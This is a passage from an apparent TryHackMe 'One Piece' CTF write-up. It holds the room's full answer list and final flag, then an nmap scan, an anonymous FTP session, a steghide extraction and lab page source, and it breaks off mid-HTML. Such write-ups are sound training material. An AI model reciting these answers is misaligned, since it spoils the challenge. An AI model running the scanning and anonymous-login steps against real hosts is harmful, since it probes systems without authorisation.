/usr/share/mysterious/on3_p1ec3.txt root@Laugh-Tale:~# cat /usr/share/mysterious/on3_p1ec3.txt cat /usr/share/mysterious/on3_p1ec3.txt One Piece: S3cr3ts_0f_tH3_W0rlD_\u0026_0f_Th3_P@st$ What is the name of the tree that contains the 1st Road Poneglyph? the whale\nWhat is the name of the 1st pirate you meet navigating the Apache Sea? Donquixote Doflamingo\nWhat is the name of the 2nd island you reach navigating the Apache Sea? Whole Cake\nWhat is the name of the friend you meet navigating the Apache Sea? Buggy the Clown\nWhat is the name of the 2nd Emperor you meet navigating the Apache Sea? Kaido of the Beasts\nWhat is the hidden message of the 4 Road Poneglyphs? M0nk3y_D_7uffy:1_w1ll_b3_th3_p1r@t3_k1ng!\nTask 3 Laugh Tale You are now able to reach Laugh Tale. Can you find the One Piece?\nWho is on Laugh Tale at the same time as Luffy? Marshall D Teach\nWhat allowed Luffy to win the fight? willpower\nWhat is the One Piece? S3cr3ts_0f_tH3_W0rlD_\u0026_0f_Th3_P@st$\n","wordCount":"3009","inLanguage":"en","datePublished":"2021-01-01T00:00:00Z","dateModified":"2026-03-01T00:10:22+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/tryhackme/one-piece/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/docs/ title=Docs><span>Docs</span></a></li><li><a href=https://s4ch.github.io/ctf/ title=CTF><span>CTF</span></a></li><li><a href=https://s4ch.github.io/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">One Piece</h1><div class=post-description>One Piece TryHackMe writeup</div><div class=post-meta><span title='2021-01-01 00:00:00 +0000 UTC'>January 1, 2021</span>&nbsp;·&nbsp;15 min&nbsp;·&nbsp;3009 words&nbsp;·&nbsp;
+<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
+,
+<a href=https://s4ch.github.io/tags/tryhackme/ class=post-tag title=tryhackme>tryhackme</a>
+,
+<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
+,
+<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
+,
+<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
+&nbsp;·&nbsp;
+<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#task-1-set-sail>Task 1 Set Sail</a></li><li><a href=#task-2-road-poneglyphs>Task 2 Road Poneglyphs</a></li><li><a href=#task-3-laugh-tale>Task 3 Laugh Tale</a></li></ul></nav></div></details></div><div class=post-content><p>A CTF room based on the wonderful manga One Piece. Can you become the Pirate King?</p><p><a href=https://tryhackme.com/room/ctfonepiece65>One Piece</a></p><ul><li>Network Enumeration</li><li>FTP Enumeration</li><li>Steganography</li><li>Web Poking</li><li>Crypthography<ul><li>Base32</li><li>Base64</li><li>Base85</li><li>Base91</li><li>Morse Code</li><li>Binary</li><li>Hex</li></ul></li><li>OSINT</li><li>Web Enumeration</li><li>Reverse Enigieering</li><li>Stored Passwords & Keys</li></ul><hr><h2 id=task-1-set-sail>Task 1 Set Sail<a hidden class=anchor aria-hidden=true href=#task-1-set-sail>#</a></h2><p>Welcome to the One Piece room.</p><p>Your dream is to find the One Piece and hence to become the Pirate King.</p><p>Once the VM is deployed, you will be able to enter a World full of Pirates.</p><p>Please notice that pirates do not play fair. They can create rabbit holes to trap you.</p><p>This room may be a bit different to what you are used to:</p><ul><li>Required skills to perform the intended exploits are pretty basic.</li><li>However, solving the (let&rsquo;s say) &ldquo;enigmas&rdquo; to know what you need to do may be trickier.</li></ul><p>This room is some sort of game, some sort of puzzle.</p><p>Please note that if you are currently reading/watching One Piece and if you did not finish Zou arc, you will get spoiled during this room.</p><ol><li>Deploy the machine and hoist the sails</li></ol><p><code>No answer needed</code></p><h2 id=task-2-road-poneglyphs>Task 2 Road Poneglyphs<a hidden class=anchor aria-hidden=true href=#task-2-road-poneglyphs>#</a></h2><p>In order to reach Laugh Tale, the island where the One Piece is located, you must collect the 4 Road Poneglyphs.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/One Piece$ sudo nmap -A -sS -sC -sV -O 10.10.93.198
+</span></span><span class=line><span class=cl>[sudo] password for kali:
+</span></span><span class=line><span class=cl>Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-11 12:31 CEST
+</span></span><span class=line><span class=cl>Nmap scan report for 10.10.93.198
+</span></span><span class=line><span class=cl>Host is up (0.061s latency).
+</span></span><span class=line><span class=cl>Not shown: 997 closed ports
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>21/tcp open  ftp     vsftpd 3.0.3
+</span></span><span class=line><span class=cl>| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+</span></span><span class=line><span class=cl>|_-rw-r--r--    1 0        0             187 Jul 26 07:27 welcome.txt
+</span></span><span class=line><span class=cl>| ftp-syst:
+</span></span><span class=line><span class=cl>|   STAT:
+</span></span><span class=line><span class=cl>| FTP server status:
+</span></span><span class=line><span class=cl>|      Connected to ::ffff:10.8.106.222
+</span></span><span class=line><span class=cl>|      Logged in as ftp
+</span></span><span class=line><span class=cl>|      TYPE: ASCII
+</span></span><span class=line><span class=cl>|      No session bandwidth limit
+</span></span><span class=line><span class=cl>|      Session timeout in seconds is 300
+</span></span><span class=line><span class=cl>|      Control connection is plain text
+</span></span><span class=line><span class=cl>|      Data connections will be plain text
+</span></span><span class=line><span class=cl>|      At session startup, client count was 4
+</span></span><span class=line><span class=cl>|      vsFTPd 3.0.3 - secure, fast, stable
+</span></span><span class=line><span class=cl>|_End of status
+</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+</span></span><span class=line><span class=cl>| ssh-hostkey:
+</span></span><span class=line><span class=cl>|   2048 01:18:18:f9:b7:8a:c3:6c:7f:92:2d:93:90:55:a1:29 (RSA)
+</span></span><span class=line><span class=cl>|   256 cc:02:18:a9:b5:2b:49:e4:5b:77:f9:6e:c2:db:c9:0d (ECDSA)
+</span></span><span class=line><span class=cl>|_  256 b8:52:72:e6:2a:d5:7e:56:3d:16:7b:bc:51:8c:7b:2a (ED25519)
+</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+</span></span><span class=line><span class=cl>|_http-server-header: Apache/2.4.29 (Ubuntu)
+</span></span><span class=line><span class=cl>|_http-title: New World
+</span></span><span class=line><span class=cl>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+</span></span><span class=line><span class=cl>TCP/IP fingerprint:
+</span></span><span class=line><span class=cl>OS:SCAN(V=7.80%E=4%D=10/11%OT=21%CT=1%CU=35961%PV=Y%DS=2%DC=T%G=Y%TM=5F82DF
+</span></span><span class=line><span class=cl>OS:24%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=A)SE
+</span></span><span class=line><span class=cl>OS:Q(SP=100%GCD=1%ISR=108%TI=Z%II=I%TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6%
+</span></span><span class=line><span class=cl>OS:O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=68DF%W2
+</span></span><span class=line><span class=cl>OS:=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNS
+</span></span><span class=line><span class=cl>OS:NW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
+</span></span><span class=line><span class=cl>OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
+</span></span><span class=line><span class=cl>OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
+</span></span><span class=line><span class=cl>OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
+</span></span><span class=line><span class=cl>OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Network Distance: 2 hops
+</span></span><span class=line><span class=cl>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>TRACEROUTE (using port 80/tcp)
+</span></span><span class=line><span class=cl>HOP RTT      ADDRESS
+</span></span><span class=line><span class=cl>1   32.28 ms 10.8.0.1
+</span></span><span class=line><span class=cl>2   63.04 ms 10.10.93.198
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 31.79 seconds
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/One Piece$ ftp 10.10.93.198
+</span></span><span class=line><span class=cl>Connected to 10.10.93.198.
+</span></span><span class=line><span class=cl>220 (vsFTPd 3.0.3)
+</span></span><span class=line><span class=cl>Name (10.10.93.198:kali): anonymous
+</span></span><span class=line><span class=cl>331 Please specify the password.
+</span></span><span class=line><span class=cl>Password:
+</span></span><span class=line><span class=cl>230 Login successful.
+</span></span><span class=line><span class=cl>Remote system type is UNIX.
+</span></span><span class=line><span class=cl>Using binary mode to transfer files.
+</span></span><span class=line><span class=cl>ftp&gt; ls -la
+</span></span><span class=line><span class=cl>200 PORT command successful. Consider using PASV.
+</span></span><span class=line><span class=cl>150 Here comes the directory listing.
+</span></span><span class=line><span class=cl>drwxr-xr-x    3 0        0            4096 Jul 26 07:41 .
+</span></span><span class=line><span class=cl>drwxr-xr-x    3 0        0            4096 Jul 26 07:41 ..
+</span></span><span class=line><span class=cl>drwxr-xr-x    2 0        0            4096 Jul 26 07:42 .the_whale_tree
+</span></span><span class=line><span class=cl>-rw-r--r--    1 0        0             187 Jul 26 07:27 welcome.txt
+</span></span><span class=line><span class=cl>226 Directory send OK.
+</span></span><span class=line><span class=cl>ftp&gt; get welcome.txt
+</span></span><span class=line><span class=cl>local: welcome.txt remote: welcome.txt
+</span></span><span class=line><span class=cl>200 PORT command successful. Consider using PASV.
+</span></span><span class=line><span class=cl>150 Opening BINARY mode data connection for welcome.txt (187 bytes).
+</span></span><span class=line><span class=cl>226 Transfer complete.
+</span></span><span class=line><span class=cl>187 bytes received in 0.00 secs (956.1110 kB/s)
+</span></span><span class=line><span class=cl>ftp&gt; cd .the_whale_tree
+</span></span><span class=line><span class=cl>250 Directory successfully changed.
+</span></span><span class=line><span class=cl>ftp&gt; ls -la
+</span></span><span class=line><span class=cl>200 PORT command successful. Consider using PASV.
+</span></span><span class=line><span class=cl>150 Here comes the directory listing.
+</span></span><span class=line><span class=cl>drwxr-xr-x    2 0        0            4096 Jul 26 07:42 .
+</span></span><span class=line><span class=cl>drwxr-xr-x    3 0        0            4096 Jul 26 07:41 ..
+</span></span><span class=line><span class=cl>-rw-r--r--    1 0        0            8652 Jul 26 07:42 .road_poneglyph.jpeg
+</span></span><span class=line><span class=cl>-rw-r--r--    1 0        0            1147 Jul 26 07:42 .secret_room.txt
+</span></span><span class=line><span class=cl>226 Directory send OK.
+</span></span><span class=line><span class=cl>ftp&gt; get .road_poneglyph.jpeg
+</span></span><span class=line><span class=cl>local: .road_poneglyph.jpeg remote: .road_poneglyph.jpeg
+</span></span><span class=line><span class=cl>200 PORT command successful. Consider using PASV.
+</span></span><span class=line><span class=cl>150 Opening BINARY mode data connection for .road_poneglyph.jpeg (8652 bytes).
+</span></span><span class=line><span class=cl>226 Transfer complete.
+</span></span><span class=line><span class=cl>8652 bytes received in 0.00 secs (4.8309 MB/s)
+</span></span><span class=line><span class=cl>ftp&gt; get .secret_room.txt
+</span></span><span class=line><span class=cl>local: .secret_room.txt remote: .secret_room.txt
+</span></span><span class=line><span class=cl>200 PORT command successful. Consider using PASV.
+</span></span><span class=line><span class=cl>150 Opening BINARY mode data connection for .secret_room.txt (1147 bytes).
+</span></span><span class=line><span class=cl>226 Transfer complete.
+</span></span><span class=line><span class=cl>1147 bytes received in 0.00 secs (2.4471 MB/s)
+</span></span><span class=line><span class=cl>ftp&gt; exit
+</span></span><span class=line><span class=cl>221 Goodbye.
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/One Piece$ cat welcome.txt
+</span></span><span class=line><span class=cl>Welcome to Zou. It is an island located on the back of a massive, millennium-old elephant named Zunesha that roams the New World.
+</span></span><span class=line><span class=cl>Except this, there is not much to say about this island.
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/One Piece$ cat .secret_room.txt
+</span></span><span class=line><span class=cl>Inuarashi: You reached the center of the Whale, the majestic tree of Zou.
+</span></span><span class=line><span class=cl>Nekomamushi: We have hidden this place for centuries.
+</span></span><span class=line><span class=cl>Inuarashi: Indeed, it holds a secret.
+</span></span><span class=line><span class=cl>Nekomamushi: Do you see this red stele ? This is a Road Poneglyph.
+</span></span><span class=line><span class=cl>Luffy: A Road Poneglyph ??
+</span></span><span class=line><span class=cl>Inuarashi: There are four Road Poneglyphs around the world. Each of them gives one of the key to reach Laugh Tale and to find the One Piece.
+</span></span><span class=line><span class=cl>Luffy: The One Piece ?? That&#39;s my dream ! I will find it and I will become the Pirate King !!!
+</span></span><span class=line><span class=cl>Nekomamushi: A lot have tried but only one succeeded over the centuries, Gol D Roger, the former Pirate King.
+</span></span><span class=line><span class=cl>Inuarashi: It is commonly known that both Emperors, Big Mom and Kaido, own a Road Poneglyph but no one knows where is the last one.
+</span></span><span class=line><span class=cl>Nekomamushi: The other issue is the power of Big Mom and Kaido, they are Emperor due to their strength, you won&#39;t be able to take them down easily.
+</span></span><span class=line><span class=cl>Luffy: I will show them, there can be only one Pirate King and it will be me !!
+</span></span><span class=line><span class=cl>Inuarashi: There is another issue regarding the Road Poneglyph.
+</span></span><span class=line><span class=cl>Nekomamushi: They are written in an ancient language and a very few people around the world can actually read them.
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/One Piece$ steghide extract -sf .road_poneglyph.jpeg
+</span></span><span class=line><span class=cl>Enter passphrase:
+</span></span><span class=line><span class=cl>wrote extracted data to &#34;road_poneglyphe1.txt&#34;.
+</span></span><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/One Piece$ cat road_poneglyphe1.txt
+</span></span><span class=line><span class=cl>FUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAXC2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBOFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFYWS2LJNEAWS2LJNFUQC4LJNFUWSALJNFUWS2IBOFUWS2LIKFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWQULJNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LJAFUWS2LJNBIWS2LJNFUQC2LJNFUWSALRNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2CRNFUWS2LJAFUWS2LJNEAXC2LJNFUQC4LJNFUWSALJNFUWS2IBNFUWS2LJAFYWS2LJNEAWS2LJNFUFC2LJNFUWSALJNFUWS2IBOFUWS2LJAFUWS2LJNEAWS2LJNFUQC2LJNFUWSALJNFUWS2IBNFUWS2LIK
+</span></span><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/One Piece$
+</span></span></code></pre></td></tr></table></div></div><p><a href=view-source:http://10.10.93.198/>view-source:http://10.10.93.198/</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE html&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>head</span> <span class=na>lang</span><span class=o>=</span><span class=s>&#34;en&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>New World<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>link</span> <span class=na>rel</span><span class=o>=</span><span class=s>&#34;stylesheet&#34;</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;./css/style.css&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>link</span> <span class=na>rel</span><span class=o>=</span><span class=s>&#34;icon&#34;</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;/writeups/tryhackme/one-piece/images/luffy_icon.png&#34;</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;image/png&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>charset</span><span class=o>=</span><span class=s>&#34;utf-8&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>  <span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;/writeups/tryhackme/one-piece/images/boat.png&#34;</span> <span class=na>alt</span><span class=o>=</span><span class=s>&#34;Boat&#34;</span> <span class=na>title</span><span class=o>=</span><span class=s>&#34;Boat&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>      Straw Hat Luffy and his crew are sailing in the New World. <span class=p>&lt;</span><span class=nt>br</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      They have only one thing in mind, reach the One Piece and hence become the
+</span></span><span class=line><span class=cl>      Pirate King, that is to say the freest man in the world.<span class=p>&lt;</span><span class=nt>br</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>br</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      Unfortunately, your navigator Nami lost the Log Pose and as you know, it
+</span></span><span class=line><span class=cl>      is not possible to properly steer without it.<span class=p>&lt;</span><span class=nt>br</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl>      You need to find the Log Pose to be able to reach the next island.
